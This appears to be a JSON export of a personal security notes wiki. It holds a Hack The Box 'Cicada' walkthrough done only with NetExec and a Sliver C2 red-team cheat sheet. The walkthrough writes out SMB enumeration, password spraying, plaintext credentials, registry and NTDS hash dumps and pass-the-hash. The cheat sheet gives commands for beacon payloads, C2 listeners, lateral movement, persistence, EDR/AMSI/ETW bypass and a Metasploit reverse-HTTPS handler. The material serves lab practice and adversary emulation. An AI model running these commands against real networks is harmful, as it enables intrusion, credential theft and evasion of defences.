{"CTF/pwn":{"title":"pwn","links":[],"tags":[],"content":"GDB &amp; r2 Tutorial"},"HTB/Cicada-HTB-solving-using-only-nxc":{"title":"Cicada HTB solving using only nxc","links":[],"tags":[],"content":"Cicada HTB [NetExec Way Only]\n\nTarget IP : 10.129.61.82\nGet the /etc/hosts populated automatically via nxc\nsudo nxc smb 10.129.61.82 --generate-hosts-file /etc/hosts\n\nLet’s enum SMB\nnxc smb cicada.htb -u a -p &#039;&#039; --shares\n\nwe are able to list shares with guest access. There are non-default shares named “HR” and “DEV”, let’s take note of them\nNow, let’s use the --rid-brute option to enumerate domain users\nnxc smb cicada.htb -u a -p &#039;&#039; --rid-brute\n\nWe can clean up the output to get a nice list of users\ncat tmp | cut -d &#039;\\&#039; -f2 | awk &#039;{print $1}&#039;\n\nAnother thing we can try is the spider_plus module, which searches file shares with read access\nnxc smb cicada.htb -u a -p &#039;&#039; -M spider_plus\n\nThe spider_plus module saves the list of files in a json file. In our case, it dumped the results in /tmp/nxc_hosted/nxc_spider_plus/10.129.61.82.json Looking at the output, we can see a file inside the HR share called “Notice from HR.txt”, which we have read access to\n\n \n{\n    &quot;HR&quot;: {\n        &quot;Notice from HR.txt&quot;: {\n            &quot;atime_epoch&quot;: &quot;2024-08-28 18:31:48&quot;,\n            &quot;ctime_epoch&quot;: &quot;2024-03-14 13:29:03&quot;,\n            &quot;mtime_epoch&quot;: &quot;2024-08-28 18:31:48&quot;,\n            &quot;size&quot;: &quot;1.24 KB&quot;\n        }\n    }\n}\nWe can use the --get-file option along with the --share option to grab the file to our local machine\nnxc smb cicada.htb -u a -p &#039;&#039; --get-file &#039;Notice from HR.txt&#039; notice-from-hr.txt --share HR\n\nInspecting the file reveals a plaintext password\nCicada$M6Corpb*@Lp#nZp!8\nSince we dont know which user that password belongs to, we can spray it with the list of users we gathered earlier.\nnxc smb cicada.htb -u users.txt -p &#039;Cicada$M6Corpb*@Lp#nZp!8&#039; --continue-on-success\n\nIn this case, we get a hit for the user michael.wrightson\nWith these credentials in hand, we can use the --users flag to enumerate more users and check their descriptions, as some users may store their passwords there\n\nWe can see a note in david.orelious’ description revealing his password\nvalid creds we have now\nuser : david.orelious pass : &#039;aRt$Lp#7t*VQ!3&#039;\nLet’s check if our new user has access to the DEV share using the --shares option\nnxc smb cicada.htb -u david.orelious -p &#039;aRt$Lp#7t*VQ!3&#039; --shares\n\nIndeed, the user has read access to that share. Once again, let’s use the spider_plus module to look for interesting files\nnxc smb 10.10.11.35 -u david.orelious -p &#039;aRt$Lp#7t*VQ!3&#039; -M spider_plus\n\n\nThere’s a PowerShell script called “Backup_script.ps1” inside the share\nWe can use the same command as before to download the PowerShell script from the DEV share\nnxc smb cicada.htb -u david.orelious -p &#039;aRt$Lp#7t*VQ!3&#039; --get-file &#039;Backup_script.ps1&#039; Backup_script.ps1 --share DEV\n\nuser : emily.oscars pass : &#039;Q!3@Lp#M6b*7t*Vt&#039;\nThey also work for winrm and we can PsRemote (Pwn3d!)\nnxc winrm cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039;\n\nNetExec has an option to execute PowerShell commands remotely using the -X option—so I can grab the flag anyway!\nnxc winrm cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -X &#039;cat C:\\Users\\emily.oscars.CICADA\\desktop\\user.txt&#039;\n\nNow heading to Administrator PrivEsc\nLet’s start by checking which groups our user belongs to using the groupmembership module for LDAP\nnxc ldap cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M groupmembership -o USER=&quot;emily.oscars&quot;\n\nLooking at the output, we see that our user is a member of the Backup Operators group, a high-privilege group. This allows us to dump NTDS\nBackup Operators\nI added a custom module of nxc to dump NTDS if the user is part of Backup Operators\n❯ nxc smb cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M backup_operator\n \nSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Triggering RemoteRegistry to start through named pipe...\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SAM to \\\\10.10.11.35\\SYSVOL\\SAM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SYSTEM to \\\\10.10.11.35\\SYSVOL\\SYSTEM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SECURITY to \\\\10.10.11.35\\SYSVOL\\SECURITY\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        $MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8\nBACKUP_O... 10.10.11.35     445    CICADA-DC        $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696\nBACKUP_O... 10.10.11.35     445    CICADA-DC        dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71\nBACKUP_O... 10.10.11.35     445    CICADA-DC        NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Dumping NTDS...\nSMB         10.10.11.35     445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.10.11.35     445    CICADA-DC        [-] Could not connect: timed out\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Cleaning dump with user Administrator and hash 2b87e7c93a3e8a0ea4a581937016f341 on domain cicada.htb\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Successfully deleted dump files !\nThis module handles everything for us and dumps the Administrator hash. We can use this hash to login to the box and read the root flag\nnxc smb cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -x &#039;type \\users\\administrator\\desktop\\root.txt&#039;\n\nBling Bling Baby All done via using only nxc !\nnothing else used at all , no additional script or tool used except only nxc"},"index":{"title":"index","links":[],"tags":[],"content":"\nSliver Wiki\nSliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver’s implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. Implants are dynamically compiled with unique X.509 certificates signed by a per-instance certificate authority generated when you first run the binary. Sliver server and client support MacOS, Windows, and Linux. Implants are supported on MacOS, Windows, and Linux.\n\nInstallation\ncurl sliver.sh/install|sudo bash\nSliver Service\ncat &gt; /etc/systemd/system/sliver.service &lt;&lt; EOL\n[Unit]\nDescription=Sliver Server\nAfter=syslog.target network.target\n \n[Service]\nType=simple\nRestart=always\nRestartSec=120\nLimitNOFILE=20000\nEnvironment=LANG=en_US.UTF-8\nExecStart=/opt/sliver/sliver-server_linux daemon -l 0.0.0.0 -p &lt;port&gt;\n \n[Install]\nWantedBy=multi-user.target\nEOL\nRestart Deamon &amp; Start Sliver\nsystemctl daemon-reload\nsystemctl enable --now sliver \nInstall Letsencrypt\napt install letsencrypt -y\nSetup Letsencrypt\napt install apache2 -y\ncertbot certonly --non-interactive --quiet --register-unsafely-without-email --agree-tos -a webroot --webroot-path=/var/www/html -d &lt;domain&gt;\nCreate a New Website\nClone website with wget.\nwget --mirror --convert-links --html-extension &lt;target&gt;\nAdd content to HTTP(S) C2 websites to make them look more legit.\nwebsites add-content --website &lt;name&gt; --web-path &lt;path&gt; --content ./public --recursive\nTeam Server\nCreate New Operator\n./sliver-server_linux operator -l &lt;teamserver_ip&gt; -p &lt;teamserver_port&gt; -n &lt;username&gt; -s /tmp/&lt;username&gt;.cfg\n\nConnect to Team Server\nsliver-client import /tmp/&lt;username&gt;.cfg\nsliver-client\nCreate New Listener\nMTLS\nmtls -l 443 -L 0.0.0.0 -p\nHTTPS\nhttps -l 443 -L 0.0.0.0 -p\nHTTPS Domain\nhttps --domain &lt;domain&gt; --cert /path/cert.pem --key /path/privkey.pem --website &lt;website_name&gt; -p\nHTTP\nhttp -l 80 -L 0.0.0.0 -p\n\nPayload Creation\nGenerate Shellcode\ngenerate beacon --mtls &lt;ip address&gt;:&lt;port&gt; -f shellcode\nGenerate Binary\ngenerate beacon --http &lt;ip address&gt;:&lt;port&gt;\nPost Exploitation\nBeacon\nuse &lt;beacon_id&gt;\nSessions\nSwitching from Beacon Mode to Session Mode\nsessions\nuse &lt;sessions_id&gt;\ninteractive\nKill All Session\nsessions -F -K\n\nLateral Movement\nSMB Listener\npivots named-pipe --bind &lt;named_pipe&gt;\nprofiles new --format service --named-pipe &lt;local_ip&gt;/pipe/&lt;named_pipe&gt; svc-smb-beacon\nPSEXEC Lateral Movement\npsexec -d Description -s PAEXEC -p svc-smb-beacon &lt;remote_computer&gt;\nWMI Lateral Movement\nsharp-wmi &#039;action=exec computername=&lt;remote_computer&gt; command=&quot;C:\\windows\\temp\\xxx.exe&quot; result=true&#039;\n\nInternal Reconnaissance\nSituational Awareness - Local\nseatbelt -p C:\\\\Windows\\\\System32\\\\werfault.exe -- &quot;-group=user&quot;\nSituational Awareness - Domain\nsharp-hound-3 -- -c all \n\nPrivilege Escalation\nsharpup -t 120 -p C:\\\\Windows\\\\System32\\\\werfault.exe audit\n\nPersistence\nsharpersist -- &#039;-t reg -c &quot;C:\\Windows\\System32\\cmd.exe&quot; -a &quot;/c calc.exe&quot; -k &quot;hkcurun&quot; -v &quot;Test Stuff&quot; -m add&#039;\n\nPivoting\nSocks Proxy\ninteractive\nuse &lt;session&gt;\nsocks5 start\n\nDefense Evasion\nTo run this command need to install extension windows-bypass\nEDR Bypass\nunhook-boof\nETW Bypass\ninject-etw-bypass &lt;pid&gt;\nAMSI Bypass\ninject-amsi-bypass &lt;pid&gt;\n\nSession Passing\nSession passing is using one payload to spawn another payload.\nInstall Metasploit\ncurl raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \\\n  chmod 755 msfinstall &amp;&amp; \\\n  ./msfinstall\nSetup Metasploit Handler\nuse exploit/multi/handler \nset payload windows/x64/meterpreter_reverse_https\nset lhost &lt;msf_ip&gt;\nset lport &lt;msf_port&gt;\nexploit -jz\nInject Metasploit\nmsf --lhost &lt;msf_ip&gt; --lport &lt;msf_port&gt;\nMisc\nInstall Extension From Local\nextensions install /path/bof\nInstall Extension Using Armory\narmory install windows-bypass\narmory install windows-pivot\narmory install situational-awareness\narmory install .net-execute\narmory install .net-pivot\narmory install .net-recon"}}